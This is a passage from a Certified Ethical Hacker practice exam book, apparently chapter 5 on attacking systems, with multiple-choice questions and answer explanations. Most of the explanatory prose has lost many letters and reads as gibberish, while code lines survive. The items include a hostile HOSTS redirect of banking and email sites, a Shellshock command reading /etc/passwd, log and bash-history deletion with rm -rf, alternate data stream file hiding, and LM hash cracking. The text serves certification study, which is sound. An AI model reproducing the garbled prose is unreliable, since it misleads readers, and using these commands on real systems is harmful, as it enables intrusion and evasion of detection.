☐✗ D is icoc bcaus, whil you ca s up a sigl poxy usig Nca, ad i may
v b possibl o chai sval ogh, i’s simply o dsigd o wok ha way
(ad ha’s wha his qusio was all abou o bgi wih). You ca s up a lisig po
wih i, bu i’s o dsigd o ac as a poxy, ad sig o up as a chai of poxis
would b isaly complicad ad ucssay wih h myiad oh opios availabl.

CEH Certified Ethical Hacker Practice Exams

122

05-ch05.indd 122 12/04/22 10:33 AM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 5

3. Th followig HOSTS fil was pulld duig a icid spos:
# Copyright (c) 1993-2009 Microsoft Corp.
#
# This is a sample HOSTS file used by Microsoft TCP/IP for Windows.
# This file contains the mappings of IP addresses to host names. Each
# entry should be kept on an individual line. The IP address should
# be placed in the first column followed by the corresponding host name.
# The IP address and the host name should be separated by at least one
# space.
# Additionally, comments (such as these) may be inserted on individual
# lines or following the machine name denoted by a '#' symbol.
#
# For example:
# 102.54.94.97 rhino.acme.com # source server
# 38.25.63.10 x.acme.com # x client host
220.181.0.16 mybank.com
220.181.0.16 amazon.com
220.181.0.16 google.com
220.181.0.16 gmail.com
220.181.0.16 facebook.com
# localhost name resolution is handled within DNS itself.
# 127.0.0.1 localhost
# ::1 localhost

Which of h followig sams bs dscibs h HOSTS fil?

A. A us o h machi ampig o go o chck hi bak accou a mybak.com
will b dicd o a Chis IP addss isad.

B. A us o h machi ampig o go o googl.com will civ a HTTP u
cod of 400.

C. A us o h machi ampig o go o gmail.com will dic o h local hos.

D. Ay DNS soluio o IP 220.181.0.16 will b dicd o o of h fiv sis
lisd i oud-obi fashio.

☑ A. Th HOSTS fil is a hig of bauy o a isum of hoo ad o,
dpdig o how you look a i. Bfo ay Widows sysm v bohs o
chck DNS fo a IP machig a am qus, i chcks h HOSTS fil fis. Fo
xampl, wh h us yps www.mybank.com i hi bows ad psss enter,
Widows chcks h HOSTS fil o s if h is a mappig fo mybak.com. If
h is o, ha’s wh h us will go. If h’s o, Widows will ask DNS fo
a IP o us. Thfo, if you di you ow HOSTS fil, you ca sav youslf fom
los of ad sam sis (jus dic hm o localhos) ad su you kids do’
accidally go somwh hy’ o supposd o. If you g a hold of you ag’s
HOSTS fil, you ca sd hm aywh you wa.

I his xampl, i appas somo has go a hold of his paicula machi’s
HOSTS fil ad has did i o sd som commo URL quss o a Chis IP.
Mayb hy’v s up fak vsios of hs sis i od o gab cdials. O mayb
hy jus wa o DoS h us. I ay cas, ay amp o go o mybak.com,
googl.com, gmail.com, amazo.com, o facbook.com will immdialy g dicd

Chapter 5: Attacking a System

123

05-ch05.indd 123 12/04/22 10:33 AM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 5

o h Chis IP lisd. Th oly way h us could avoid his is o us IP addsss
isad of amd URLs.

Oh, ad o mo hig: Jus how do w kow i’s a Chis IP addss? Whois,
of cous, wh you ca dmi h 220.181.0.0/19  block is assigd o
CHINANET.

☐✗ B is icoc bcaus i is impossibl o ll if h 400 u cod (which mas h
sv cao o will o pocss h qus du o a appa cli o, such as
a malfomd qus syax, ivalid qus mssag famig, o dcpiv qus
ouig) would appa. If h qus is valid (i should b) ad h sv is capabl
of gisig h qus as valid (agai, ha dpds o wha h bad guy s up o
ha paicula IP), h Cod 400 will o b ud.

☐✗ C ad D a icoc bcaus ih machs h acio ak i a HOSTS fil y.

4. Which of h followig ops h Compu Maagm MMC i a Widows
commad li?

A. compmgm.mmc

B. compmgm.msc

C. compmgm.x

D. compumgm.x

☑ B. Admidly his o is a asy pick—assumig, of cous, you’v sudid ad
kow you MMCs i Widows. You hav sudid hm, igh? Bcaus if you had,
you’d kow ha h Micosof Maagm Cosols ca b usd fo a vaiy of
asks. Som of hs MMCs iclud Compu Maagm, Dvic Maagm,
Ev Viw, Goup Policy Edio, ad Aciv Dicoy Uss ad Compus.
Whil you ca ca you ow cusom MMC, by ypig mmc i h commad li
ad h usig Add/Rmov Sap I fom h mu li, you ca also jus op
h idividual cosols hmslvs by usig hi “msc” commad-li opio. Fo
xampl, Compu Maagm ca b a sap-i fo a cusom MMC, o you ca
op i by islf usig h compmgm.msc commad. Ohs you may wa o kow
fo fuu fc iclud AD Uss ad Compus (dsa.msc), Dvic Maag
(dvmgm.msc), Ev Viw (vvw.msc), Local Goup Policy Edio (gpdi.msc),
ad Local Scuiy Sigs Maag (scpol.msc).

☐✗ A, C, ad D a all icoc bcaus hy do o mach h syax fo opig
Compu Maagm.

5. Which of h followig will xac a xcuabl fil fom NTFS samig?

A. c:\> ca fil1.x:hidd.x > visibl.x

B. c:\> mo fil1.x | hidd.x > visibl.x

C. c:\> yp opad.x > fil1.x:hidd.x

D. c:\> lis fil1.x$hidd.x > visibl.x

CEH Certified Ethical Hacker Practice Exams

124

05-ch05.indd 124 12/04/22 10:33 AM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 5

☑ A. This is h coc syax. Th ca commad will xac h xcuabl dicly io
h fold you xcu h commad fom. NTFS fil samig allows you o hid
viually ay fil bhid ay oh fil, dig i ivisibl o dicoy sachs. Th
fil ca b a x fil, o mid you of sps o ak wh you u o h ag, o
v a xcuabl fil you ca u a you lisu la. Ala daa sam (ADS)
i h fom of NTFS fil samig is a fau of h Widows-aiv NTFS o
su compaibiliy wih Appl fil sysms (calld HFS). B caful o h xam—
you will s ADS ad NTFS fil samig usd ichagably. As a asid, h ca
commad is’ availabl o Widows 7 ad Widows 10 machis (you’ll d a
Liux mulao o somhig lik i o us h ca commad o hs). Wha’s mo,
you ca us c:\> (more<file1.txt:hidden.exe) > output.txt as aoh opio. This
will ad h oupu of h hidd sam ad wi i o h oupu.x fil wihou
havig o us ca.

☐✗ B is icoc bcaus his is o h coc syax. Th is o pip (|) fucio i
xacig a fil, ad h mo commad is usd o display h cos of a x fil,
o xac a xcuabl fom ADS.

☐✗ C is icoc bcaus his is o h coc syax. This opio would display h
cos of a hidd x fil—mayb o you’v sowd isucios i fo us la.

☐✗ D is icoc bcaus h syax is o coc by ay sch of h imagiaio.
This is icludd as a disaco.

6. Which commad is usd o a Liux machi o allow all pivilgs o h us, ad-oly
o h goup, ad ad-oly fo all ohs o a paicula fil?

A. chmod 411 fil1

B. chmod 114 fil1

C. chmod 117 fil1

D. chmod 711 fil1

E. chmod 744 fil1

☑ E. You’ goig o d o kow som basic Liux commads o suviv his xam,
ad o commad I ca guaa you’ll s a qusio o is chmod. Fil pmissios
i Liux a assigd via h us of h biay quival fo ach wx goup: ad is
quival o 4, wi o 2, ad xcu o 1. To accumula pmissios, you add h
umb: 4 is ad-oly, 6 is ad ad wi, ad addig xcu o h buch suls i 7.
As a asid, if you hik i biay, h umbs a jus as asy o dfi: 111 quas o
7 i dcimal, ad ach bi ud o givs ad, wi, ad xcu. Sig h bis o
101 us o ad, us off wi, ad us o xcu; ad is dcimal quival is 5.

☐✗ A, B, C, ad D a all icoc syax fo wha w’ yig o accomplish h:
411 quas o ad-oly, xcu, ad xcu, wih 114 big h vs of ha,
ad 117 quas o xcu, xcu, ad full pmissios, wih 711 big h vs.

Chapter 5: Attacking a System

125

05-ch05.indd 125 12/04/22 10:33 AM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 5

7. Exami h followig passwd fil:
root:x:0:0:root:/root:/bin/bash
mwalk:x:500:500:Matt Walker,Room 2238,email:/home/mwalk:/bin/sh
jboll:x:501:501:Jason Bollinger,Room 2239,email:/home/jboll:/bin/sh
rbell:x:502:502:Rick Bell,Room 1017,email:/home/rbell:/bin/sh
afrench:x:503:501:Alecia French,Room 1017,email:/home/afrench:/bin/sh

Which of h followig sams a u gadig his passwd fil? (Choos all ha apply.)

A. No of h us accous has passwods assigd.

B. Th sysm maks us of h shadow fil.

C. Th oo accou passwod is oo.

D. Th oo accou has a shadowd passwod.

E. Fils cad by Alcia will iiially b viwabl by Jaso.

☑ B, D, E. If h a o wo o fou qusios o you xam gadig h Liux
passwd fil, I’ll a my ha. Evy xam ad pacic xam I’v v ak fcs
his fil—a lo—ad i’s icludd h o su you pay aio. Filds i h
passwd fil, fom lf o igh, a as follows:

• User Name This is wha h us yps i as h logi am. Each us am
mus b uiqu.

• Password If a shadow fil is big usd, a x will b displayd h. If o,
you’ll s a cypd passwod (i cu OS vsios), ad oly if you a oo.
As a asid, sig his o a asisk (*) is a mhod o daciva a accou.

• UID Th us idifi is usd by h opaig sysm fo ial puposs.
I is ypically icmd by 1 fo ach w us addd.

• GID Th goup idifi idifis h pimay goup of h us. All fils ha
a cad by his us will omally b accssibl o his goup, ulss a chmod
commad pvs i (which is h aso fo h “iiial” poio of h qusio).

• Gecos This is a dscipiv fild fo h us, gally coaiig coac
ifomaio spaad by commas.

• Home Directory This is h locaio of h us’s hom dicoy.

• Startup Program This is h pogam ha is sad vy im h us logs i.
I’s usually a shll fo h us o iac wih h sysm.

☐✗ A is icoc bcaus h x idicas a shadowd passwod, o h absc of o.

☐✗ C is icoc bcaus h x idicas ha oo dos idd hav a passwod, bu i is
shadowd. Could i acually b oo? Su, bu h’s o way o ll ha fom his lisig.

8. You a ampig o hack a Widows machi ad wa o gai a copy of h SAM fil.
Wh ca you fid i? (Choos all ha apply.)

A. /c/passwd

B. /c/shadow

CEH Certified Ethical Hacker Practice Exams

126

05-ch05.indd 126 12/04/22 10:33 AM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 5

C. c:\widows\sysm32\cofig

D. c:\wi\cofig

E. c:\widows\pai

☑ C, E. P Micosof’s dfiiio, h Scuiy Accou Maag (SAM) is a daabas
ha sos us accous ad scuiy dscipos fo uss o h local compu.
Th SAM fil ca b foud i c:\widows\sysm32\cofig. If you’ havig poblms
gig h, y pullig a copy fom sysm so (c:\widows\pai).

☐✗ A ad B a boh icoc bcaus /c is a dad givaway his is a Liux fold (o
h fowad slash isad of h Widows backwad slash). Th /c fold coais
all h admiisaio fils ad passwods o a Liux sysm. Boh h passwod ad
shadow fils a foud h.

☐✗ D is icoc bcaus his is o h coc locaio of h SAM. I’s icludd as a
disaco.

9. Which of h followig sams a u cocig Kbos? (Choos all ha apply.)

A. Kbos uss symmic cypio.

B. Kbos uss asymmic cypio.

C. Clis ask fo auhicaio icks fom h KDC i cla x.

D. KDC sposs o clis v iclud a passwod.

E. Clis dcyp a TGT fom h sv.

☑ A, B, C, D, E. All asws a coc. Kbos maks us of boh symmic ad
asymmic cypio chologis o sculy asmi passwods ad kys acoss a
wok. Th i pocss cosiss of a ky disibuio c (KDC), a auhicaio
svic (AS), a ick gaig svic (TGS), ad h ick gaig ick (TGT). A basic
Kbos xchag sas wih a cli askig h KDC, which holds h AS ad TGS,
fo a ick, which will b usd o auhica houghou h wok. This qus is i
cla x. Th sv will spod wih a sc ky, which is hashd by h passwod copy
kp o h sv (passwods a v s—oly hashs ad kys). This is kow as h
TGT. Th cli dcyps h mssag, sic i kows h passwod, ad h TGT is s
back o h sv qusig a TGS svic ick. Th sv spods wih h svic
ick, ad h cli is allowd o log o ad accss wok soucs.

10. Wha is h diffc bw a dicioay aack ad a hybid aack?

A. Dicioay aacks a basd solly o wodliss, whas hybid aacks mak us of
boh wodliss ad aibow abls.

B. Dicioay aacks a basd solly o whol wodliss, whas hybid aacks ca us
a vaiy of ls, umbs, ad spcial chaacs.

C. Dicioay aacks us pdfid wodliss, whas hybid aacks subsiu
umbs ad symbols wihi hos wods.

D. Hybid ad dicioay aacks a h sam.

Chapter 5: Attacking a System

127

05-ch05.indd 127 12/04/22 10:33 AM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 5

☑ C. A hybid aack is a vaia o a dicioay aack. I his ffo, you sill hav
a wodlis; howv, h cack is sma ough o plac ls ad chaacs
wihi hos wods. Fo xampl, boh aacks migh us a lis coaiig h wod
Passwod. To hav mulipl vaias o i, h dicioay aack would d o hav
ach vaia addd o h lis idividually (P@sswod, Pa$$wod, ad so o). A hybid
aack would qui h wodlis oly o iclud Passwod bcaus i would swap ou
chaacs ad ls o fid diff vsios of h sam wod.

☐✗ A is icoc bcaus hybid aacks do’ us aibow abls.

☐✗ B is icoc bcaus dicioay aacks ca us vaias of a whol wod; hy jus
d o b lisd spaaly i h lis.

☐✗ D is icoc bcaus hybid ad dicioay aacks a mos dfiily diff.

11. Which of h followig coais a lisig of po umbs fo wll-kow svics dfid
by IANA?

A. %widi%\c\liss

B. %widi%\sysm32\divs\c\lmhoss

C. %widi%\sysm32\divs\c\svics

D. %widi%\sysm32\divs\c\hoss

☑ C. I’v sa back may ims i wiig hs books sugglig o dmi why
cai spcific bu o vy usful higs sm o b so a ad da o h xam
qusio wis, bu I ca’ fid ay paicula hym o aso. Somims you jus
hav o mmoiz ad mov o, ad his xampl is o xcpio. If you happ o
b ou o you al job ad complly fog vy wll-kow po umb, you’d
pobably jus look up h lis o a I sach. If you’ bod o ally dy,
hough, you ca pull up a lis of hm by visiig h svics fil. I’s siig igh
h bsid h HOSTS ad LMHOSTS fils.

☐✗ A, B, ad D a icoc bcaus hs locaios do o hold h svics fil.

12. Which of h followig SIDs idicas h u admiisao accou?

A. S-1-5-21-1388762127-2960977290-773940301-1100

B. S-1-5-21-1388762127-2960977290-773940301-1101

C. S-1-5-21-1388762127-2960977290-773940301-500

D. S-1-5-21-1388762127-2960977290-773940301-501

☑ C. Th scuiy idifi (SID) i Widows is usd o idify a “scuiy picipl.”
I’s uiqu o ach accou ad svic ad is good fo h lif of h picipl.
Evyhig ls associad wih h accou is simply a popy of h SID, allowig
accous o b amd wihou affcig hi scuiy aibus. I a Widows
sysm, h u admiisao accou always has a RID (laiv idifi) of 500.

CEH Certified Ethical Hacker Practice Exams

128

05-ch05.indd 128 12/04/22 10:33 AM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 5

☐✗ A ad B a icoc bcaus ih 1100 o 1101 is h RID associad wih h
admiisao accou. RID valus bw 1000 ad 1500 idica a sadad us
accou.

☐✗ D is icoc bcaus 501 is h RID fo h gus accou.

13. I which sp of EC-Coucil’s sysm hackig mhodology would you fid sgaogaphy?

A. Cackig passwods

B. Escalaig pivilgs

C. Excuig applicaios

D. Hidig fils

E. Covig acks

☑ D. Ys, somims you g a qusio ha’s laivly asy, ad his is a pim xampl.
Hidig fils is xacly wha i souds lik: fidig a way o hid fils o h sysm.
Th a iumabl ways o accomplish his, bu sgaogaphy is o mhod
you’ll mos likly s fcd o h xam. Sgaogaphy hids higs such as
passwods, fils, o malicious cod (l’s jus say ayhig ha ca b pu io a biay
foma) isid imags, vido, ad such. Th oh fil-hidig chiqu you’ll mos
likly s fcd o h xam is NTFS fil samig.

☐✗ A, B, C, ad E a icoc bcaus you do o hid fils i hs sps. Cackig
passwods is slf-xplaaoy. Escalaig pivilgs fs o h mas ak o lva
accss o admiisao lvl. Excuig applicaios is xacly wha i souds lik, ad
you’ll pobably s mo xcuio ools fcd (ad, fo som biza aso,
kyloggs ad spywa). Covig acks dals wih poxis, log fils, ad such.

14. A viw of h commad hisoy o a Liux box shows h followig commad d:
env x= '(){ :;};echo exploit ' bash –c 'cat/etc/passwd

Which of h followig is h bs dscipio of wha h aack is ampig o
accomplish?

A. Add a us o h sysm.

B. Elva cu logi pivilgs.

C. Chag passwods fo uss.

D. Display passwod fil cos.

☑ D. Ev had of Bashdoo (aka h Shllshock vulabiliy)? Of cous you hav, ad
ha’s wha’s big ampd h. Vulabl vsios of h Bash shll (commoly
usd o pocss quss) allow a aack o xcu abiay commads cocaad
o h d of fucio dfiiios sod i viom vaiabls. I his cas, h
aack is yig o ad h cos of h passwod fil usig h ca commad.

☐✗ A, B, ad C a icoc bcaus hy do o mach h commad syax.

Chapter 5: Attacking a System

129

05-ch05.indd 129 12/04/22 10:33 AM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 5

15. You a xamiig LM passwod hashs ad s h followig:

3A02DF5289CF6EEFAAD3B435B51404EE

Which of h followig passwods is mos likly o hav cad h hash?

A. 123456789

B. CEHISHARD

C. c3HisH@RD!

D. CEHhad

☑ D. You will caily s LM hashs o you xam a las oc o wic, ad usually
i his yp of scaio. EC-Coucil is’ jus goig o com ou ad ask you if you
kow ha h las half of h LM hash is always h sam if h passwod is sv
chaacs o lss—hy’ goig o how i i a scaio ad s if you mmb
i i h sss of s im. Fo viw puposs, LM splis ay passwod io wo
sv-chaac pics ad hashs ach pic. If h passwod is sv chaacs o
lss, h las half of h hash is always h valu of a hash of ohig (which quas
o AAD3B435B51404EE, by h way). I his qusio, apply h LM “spliig” of
passwods io wo spaa goups of sv chaacs, ad i’s asy o s h asw:
h fis sv chaacs a CEHhad ad h scod sv do o xis, so h hash
of CEHhad quals 3A02DF5289CF6EEF, ad h hash of h blak chaacs
quals AAD3B435B51404EE.

O a fial o, bcaus i’s lad h, do’ g hug up o passwod complxiy
ulss i is xplicily od i h qusio. Mos popl a i a ush duig h
xam ad may o ad higs cafully. Glacig a h asws, hs folks migh
pick h complx passwod by misak. Thfo, us cauio i adig h
qusios—ak im o fully udsad wha hy’ askig fo bfo jus clickig
h choic ad movig o.

☐✗ A is icoc bcaus his passwod has i chaacs; hfo, h scod half of
h hash would b diff (LM would hash 1234567 ad h 89).

☐✗ B is icoc bcaus his passwod also has i chaacs; hfo, h scod
half of h hash would b diff (LM would hash CEHISHA ad h RD).

☐✗ C is icoc bcaus his passwod has  chaacs; hfo, h scod half of
h hash would b diff (LM would hash c3HisH@ ad h RD!).

16. You a xamiig hisoy logs o a Liux machi ad o h aack addd a
ampsad (&) af a fw pocss commads. Which of h followig sams is u
gadig his?

A. Th & symbol has o ffc o h pocss commad.

B. Th & symbol us h pocss as a backgoud ask ad closs i wh h us logs off.

C. Th & symbol sus h pocss coius o u af h us logs off.

D. Th & symbol cocaas h pocss o subsqu commads.

CEH Certified Ethical Hacker Practice Exams

130

05-ch05.indd 130 12/04/22 10:33 AM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 5

☑ B. Okay, so his o is a lil picky, I admi i, bu los of qusios o you xam
will b picky, so I’m o apologizig. Th ampsad (&) is o oly o of h
cools soudig chaac symbols of all im, bu i’s also usd i h Liux
commad li o plac a pocss i h backgoud ad caus i o clos a us
logoff. As a asid, you ca us h bg ad fg commads o mov pocsss o h
backgoud ad fogoud, spcivly.

☐✗ A is icoc bcaus h & symbol dos hav a ffc o h commad.

☐✗ C is icoc bcaus h pocss will o coiu o u af logoff.

☐✗ D is icoc bcaus h & symbol dos o cocaa ayhig.

17. Which of h followig a cosidd offli passwod aacks? (Choos all ha apply.)

A. Usig a hadwa kylogg

B. Bu-foc cackig wih Cai ad Abl o a sol SAM fil

C. Usig Joh h Ripp o a sol passwd fil

D. Should sufig

☑ A, B, C. A offli passwod aack occus wh you ak h passwod fil (o h
passwods hmslvs) offli fo wok. A commo mhod ivolvs salig
h SAM o passwd (shadow) fil ad h uig a dicioay, hybid, o bu-
foc aack agais i (usig a passwod-cackig ool such as Cai ad Abl o Joh
h Ripp). Kyloggs a also cosidd offli aacks bcaus you xami h
cos off wok.

☐✗ D is icoc bcaus should sufig is cosidd aoh fom of aack alogh—
a olcoic aack. No, I’m o makig his up; i’s acually a m i CEH ligo
ad fs o social giig mhods of obaiig a passwod. Should sufig is
basically sadig bhid somo ad wachig hi kysoks.

18. If a ooki is discovd o h sysm, which of h followig is h best alaiv fo
covy?

A. Rplacig all daa fils fom a good backup

B. Isallig Tipwi

C. Rloadig h i sysm fom kow-good mdia

D. Dlig all daa fils ad booig

☑ C. Somims a good old wip ad load is o oly fas ha a claig ffo bu
is jus fla ou b. Ad wh i coms o ookis, i’s ally you oly opio. If i’s
a off-h-shlf ooki ha has b documd, i’s likly ha good isucios
o how o fully mov i a availabl somwh, bu mmb ha whil you think
you may hav i movd by followig moval isucios, you know i’s go if you
blow h sysm away ad load i.

Chapter 5: Attacking a System

131

05-ch05.indd 131 12/04/22 10:33 AM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 5

☐✗ A ad D a icoc bcaus aly ayhig you’ doig wih h daa fils
hmslvs is’ goig o hlp i gig id of a ooki. Th dvic has b ood,
so all daa should b ad as suspc.

☐✗ B is icoc bcaus, whil Tipwi is a ga ool, i is’ ally usful o you oc
h machi has b ifcd.

19. Exami h followig poio of a log fil, capud duig a hackig amp:
[matt@localhost]#rm –rf /tmp/mykit_headers
[matt@localhost]#rm –rf /var/log/messages
[matt@localhost]#rm –rf /root/.bash_history

Wha was h aack ampig o do?

A. Copy fils fo la xamiaio.

B. Cov his acks.

C. Chag h shll o lock ou oh uss.

D. Upload a ooki.

☑ B. You’ll dfiily s basic Liux commads o you s, ad his is o xampl of
how you’ll b askd abou hm. I his xampl, h m commad is usd o mov
(dl) fils o a Liux sysm. Lookig a wha h hack is ampig o mov,
i sms logical o assum—v wihou sig h s of h log—ha h hack is
covig his acks.

☐✗ A is icoc bcaus h commad fo copy i Liux is cp.

☐✗ C is icoc bcaus h shll is o big ampd wih. This asw is icludd as
a disaco.

☐✗ D is icoc bcaus h is o vidc i his capu ha ayhig is big
uploadd; all commads a fo h moval of fils (usig h m commad). Gad,
i’s highly likly somhig was uploadd bfo his poio, bu w’ o pivy o
ha ifomaio h.

20. You suspc a hack has occud agais you Liux machi. Which commad will display
all uig pocsss fo you o viw?

A. ls -d

B. ls -l

C. su

D. ps -f

E. ifcofig

☑ D. Th ps commad is usd i Liux o display pocsss. Th - swich slcs all
pocsss, uig o o, ad h -f swich povids a full lisig. A coupl of oh
opios you migh s iclud - (sic oupu o uig pocsss), -u (slc by
ffciv us ID; suppos ams), ad -p (slc by pocss ID).

CEH Certified Ethical Hacker Practice Exams

132

05-ch05.indd 132 12/04/22 10:33 AM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 5

☐✗ A ad B a icoc bcaus h ls commad i Liux liss fils isid a soag
dicoy. A coupl swichs of o iclud -d (lis dicoy is isad of
cos), -h (pi sizs i huma-adabl foma), -l (us a log lisig foma),
ad -p (fil yp).

☐✗ C is icoc bcaus h su commad i Liux is fo “swich us.” Assumig you
hav pmissio/auhicaio o do so, his allows you o chag h ffciv us
ID ad goup ID o whav you wa.

☐✗ E is icoc bcaus ifcofig is usd o cofigu a wok ifac i Liux. I looks,
ad woks, vy much lik h ipcofig commad i Widows, which maks i a
asy ag fo s qusio wis, so pay clos aio o h OS wh askd abou
cofiguig you NIC.

21. A ogaizaio was o cool wok affic ad pfom saful ispcio of affic
goig io ad ou of is DMZ. Which buil-i fucioaliy of Liux ca achiv his?

A. ipabls

B. ipchais

C. ipsiff

D. ipfiwall

☑ A. Ipabls is a buil-i “us spac” applicaio i Liux ha allows you o cofigu
h abls usd by h Liux kl fiwall. I mus b xcud wih oo pivilgs
ad allows fo saful ispcio. O mos Liux sysms, ipabls is isalld as
/us/sbi/ipabls.

☐✗ B is icoc bcaus ipchais wo’ allow fo saful ispcio.

☐✗ C ad D a icoc bcaus, as fa as I kow, h’s o such hig as ipsiff o
ipfiwall.

22. Which of h followig bs dscibs Cygwi?

A. Cygwi is a Uix subsysm uig o op of Widows.

B. Cygwi is a Widows subsysm uig o op of Uix.

C. Cygwi is a C++ compil.

D. Cygwi is a passwod-cackig ool.

☑ A. Cygwi (www.cygwi.com/) povids a Liux-lik viom fo Widows. I’s a
lag collcio of GNU ad op souc ools ha povid fucioaliy simila o
a Liux disibuio o Widows, ad i icluds a DLL (cygwi1.dll) ha povids
subsaial POSIX API fucioaliy, accodig o h Cygwi wbsi. Th Cygwi
DLL culy woks wih all c, commcially lasd x86 32-bi ad 64-bi
vsios of Widows, saig wih Widows XP SP3.

☐✗ B, C, ad D a icoc dscipios of Cygwi.

Chapter 5: Attacking a System

133

05-ch05.indd 133 12/04/22 10:33 AM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 5

23. Which fold i Liux holds admiisaiv commads ad damos?

A. /sbi

B. /bi

C. /dv

D. /m

E. /us

☑ A. Th sysm biais fold holds mos admiisaiv commads (/c holds ohs)
ad is h posioy fo mos of h ouis Liux us (kow as daemons).

☐✗ B is icoc bcaus his fold holds a vaiy of basic Liux commads (a lo lik
h C:\Widows\Sysm32 fold i Widows).

☐✗ C is icoc bcaus his fold coais h poi locaios o h vaious soag
ad ipu/oupu sysms you will d o mou if you wa o us hm, such
as opical divs ad addiioal had divs o paiios. By h way, vyhig i
Liux is a fil. Evyhig.

☐✗ D is icoc bcaus his fold holds h accss locaios you’v acually moud.

☐✗ E is icoc bcaus his fold holds mos of h ifomaio, commads, ad fils
uiqu o h uss.

24. Which of h followig is h appopia mas o pivo wihi a Masploi aack sssio?

A. Us h pivo xploi ousid mp.

B. Rcofigu wok sigs i mp.

C. S h payload o popaga.

D. Ca a ou sam i h mp.

☑ D. To asw his, you hav o kow wha pivot mas ad wha h mp is,
ad h bs xplaaios fo boh a foud igh o h Offsiv Scuiy wbsi
(www.offsiv-scuiy.com/): “Pivoig is h uiqu chiqu of usig a isac
(also fd o as a plant o foothold) o b abl o ‘mov’ aoud isid a wok.
Basically usig h fis compomis o allow ad v aid i h compomis of oh
ohwis iaccssibl sysms. Masploi has a auoou mp scip ha
allows a aack io a scoday wok hough a fis compomisd machi.
Mp is a advacd, dyamically xsibl payload ha uss i-mmoy DLL
ijcio sags ad is xdd ov h wok a uim. Mp sids
ily i mmoy ad wis ohig o disk.” Addig a ou sam isid h
dyamic mp viom allows h aack o “pivo” o a w ag. Na, h?

☐✗ A, B, ad C a icoc bcaus hy a ih lgiima o accua sams
gadig a pivo aack.

CEH Certified Ethical Hacker Practice Exams

134

05-ch05.indd 134 12/04/22 10:33 AM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 5

25. You a xamiig fils o a Widows machi ad o o fil’s aibus iclud “h.”
Wha dos his idica?

A. Th fil is flaggd fo backup.

B. Th fil is pa of h hlp fucio.

C. Th fil is fagmd bcaus of siz.

D. Th fil has b quaaid by a aivius pogam.

E. Th fil is hidd.

☑ E. Th hidd aibu ca b s o ay fil o hid i fom sadad dicoy
sachs. You ca accomplish his wih h commad li
attrib +h filename

o by igh-clickig, choosig Popis, ad slcig h Hidd aibu chck
box a h boom of h dialog.

☐✗ A, B, C, ad D a all icoc dfiiios of h hidd aibu.

26. A aack has gaid accss o a ial sysm. Usig Masploi, h accsss ad
aacks oh ial sysms. Which of h followig ms bs dscib h acio ak?

A. Aack spliig

B. Pivoig

C. Aack swigig

D. Higig

☑ B. I lov dfiiio qusios o h xam—hy’ simpl ad asy. Pivoting fs o
aacks usig a compomisd sysm o accss sysms hy’d ohwis o b abl
o g o. You ca us h ou sam mp aack sssio o pivo fom h
compomisd sysm oo ohs. Offsiv Scuiy (hps://www.offsiv-scuiy
.com/masploi-ulashd/pivoig/) has a ga wi-up o usig h auoou
mp scip fo h sam pupos.

☐✗ A, C, ad D a icoc bcaus hs asws do o mach ay acio ak fom
Masploi.

27. Which aciv oli aack combis is of o dicioay fil wih hos of a scod
o ga w wodliss fo passwod cackig?

A. Combiao

B. Figpi

C. Toggl-Cas

D. Makov-Chai

Chapter 5: Attacking a System

135

05-ch05.indd 135 12/04/22 10:33 AM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 5

☑ A. As I’v miod iumabl ims i his book ad i h compaio book
CEH All-in-One Exam Guide, Fifth Edition, somims h a jus ms ad
miology you simply hav o commi o mmoy. This is a pim xampl. Of h
choics povidd, h combiao aack maks h mos ss h. I a combiao
aack, h fis wods fom o dicioay fil a combid wih hos fom a scod
o ga a bad-w wodlis, which is h usd o hlp cack h passwods.

☐✗ B is icoc bcaus i a figpi aack, h passphas is bok dow io sigl-
ad mulichaac combiaios—figpis—o hlp cack complx passwods.

☐✗ C is icoc bcaus i a Toggl-Cas aack, amps a mad of vy possibl
combiaio of upp- ad lowcas ls of a wod i h dicioay fil.

☐✗ D is icoc bcaus i a Makov-Chai aack, h passwod is spli io wo- o
h-chaac syllabls, caig, i ffc, a w alphab fo passwod cackig.

28. Which auhicaio mhod uss DES fo cypio ad focs 14-chaac passwods
fo hash soag?

A. NTLMv1

B. NTLMv2

C. LAN Maag

D. Kbos

☑ C. LAN Maag is a old auhicaio modl ha bus oo h sc aoud
h Widows 95 lauch. I uss DES as a cypio sadad (a 56-bi ky DES,
o b chical) ad, as covd bfo, has a quiky habi of capializig passwods
ad spliig hm io wo sv-chaac halvs. Bliv i o o, his is sill i us
i h fild. I’s mos of foud i placs wh backwad compaibiliy was dd
fo somhig ad, vually, i was jus fogo o ovlookd.

☐✗ A is icoc bcaus NTLMv1 (NT LAN Maag) impovd upo LM mhods.
I soppd cazy pacics such as paddig passwods o 14 chaacs, ad i suppod
sog cypio.

☐✗ B is icoc bcaus NTLMv2 also did o follow h cypio mhods usd by
LM. I addiio o h impovms fom vsio 1, NTLMv2 mad us of 128-bi
MD5 hashig.

☐✗ D is icoc bcaus Kbos is a sog ad scu auhicaio mhod ha
dos o wok lik LM. Kbos maks us of a ky disibuio c (KDC) ad
gas icks o poply auhicad clis o accss soucs o h wok.

CEH Certified Ethical Hacker Practice Exams

136

05-ch05.indd 136 12/04/22 10:33 AM



